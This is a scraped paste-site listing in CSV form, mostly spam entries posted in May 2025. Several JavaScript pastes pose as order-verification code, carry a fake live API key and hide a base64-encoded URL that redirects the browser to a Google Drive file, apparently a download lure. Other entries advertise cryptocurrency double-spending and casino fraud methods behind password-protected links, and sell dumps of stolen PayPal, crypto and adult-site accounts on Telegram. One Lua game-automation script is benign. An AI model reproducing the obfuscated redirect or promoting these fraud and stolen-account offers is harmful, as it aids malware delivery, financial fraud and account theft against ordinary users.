id,title,username,language,date,content
usVbxe67,Order.js,x2LeaF,JavaScript,Friday 2nd of May 2025 05:51:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15308/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uWtkEq9u,Abuse RBF in BTC transactions,rodrigomaise99,JavaScript,Friday 2nd of May 2025 05:51:12 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 20923
erKHTbDa,PayPal with Balance,Xp_Isolation,JavaScript,Friday 2nd of May 2025 05:50:58 PM CDT,81851 Accounts Posted On https://t.me/leakzbyeminem
pBQ61Erb,Market.js,x2LeaF,JavaScript,Friday 2nd of May 2025 05:36:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80064/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q709LQfk,Stake Free Balance Method,rodrigomaise99,JavaScript,Friday 2nd of May 2025 05:35:50 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 57183
nRbqFibk,Leaked Accounts - Fresh Hits,Xp_Isolation,JavaScript,Friday 2nd of May 2025 05:35:36 PM CDT,17935 Accounts Posted On https://t.me/leakzbyeminem
HYriHdYV,Untitled,krajetum,Lua,Friday 2nd of May 2025 05:25:25 PM CDT,"local dim_x = 5 
local dim_y = 4


for mx = -1, dim_x + 1 do
	turtle.turnLeft() 
	for my = 0, dim_y do
		turtle.up()
		local has_block, data = turtle.inspect()
		if has_block then
			print(data.name)
			if string.find(data.name, ""cobblemon"") then
				print(""picking "" + data.name)
				turtle.place()
			end
		else
		end
	end
	for my = 0, dim_y do
		turtle.down()
	end
	turtle.turnRight()
    turtle.forward()
end

"
Y2xrqtHA,Untitled,x2LeaF,JavaScript,Friday 2nd of May 2025 05:20:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66274/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JdGDqyXa,Scam Casinos and Stores,rodrigomaise99,JavaScript,Friday 2nd of May 2025 05:20:29 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 97017
mFrYnBgk,Chaturbate with Tokens,Xp_Isolation,JavaScript,Friday 2nd of May 2025 05:20:12 PM CDT,96546 Accounts Posted On https://t.me/leakzbyeminem
tif7fhfd,Products.js,x2LeaF,JavaScript,Friday 2nd of May 2025 05:05:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19956/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kYG9G0aP,Doublespending using Vanity Wallet,rodrigomaise99,JavaScript,Friday 2nd of May 2025 05:05:07 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 69540
6wBvNXEA,Crypto Accounts,Xp_Isolation,JavaScript,Friday 2nd of May 2025 05:04:47 PM CDT,48836 Accounts Posted On https://t.me/leakzbyeminem
4wUunvtL,Order.js,x2LeaF,JavaScript,Friday 2nd of May 2025 04:50:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30677/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SU8gPgei,Abuse RBF in BTC transactions,rodrigomaise99,JavaScript,Friday 2nd of May 2025 04:49:45 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 87089
SksrTcT8,PayPal with Balance,Xp_Isolation,JavaScript,Friday 2nd of May 2025 04:49:25 PM CDT,43262 Accounts Posted On https://t.me/leakzbyeminem
J5ekN3sP,Market.js,x2LeaF,JavaScript,Friday 2nd of May 2025 04:34:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88965/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PNMnFChx,Stake Free Balance Method,rodrigomaise99,JavaScript,Friday 2nd of May 2025 04:34:24 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 65031
GwH8jkmR,Crypto Accounts,rodrigomaise99,JavaScript,Friday 2nd of May 2025 04:33:50 PM CDT,56186 Accounts Posted On https://t.me/leakzbyeminem
SXCMd6iv,Untitled,x2LeaF,JavaScript,Friday 2nd of May 2025 04:19:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32333/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GZv1UTnY,Abuse RBF in BTC transactions,x2LeaF,JavaScript,Friday 2nd of May 2025 04:18:57 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 11064
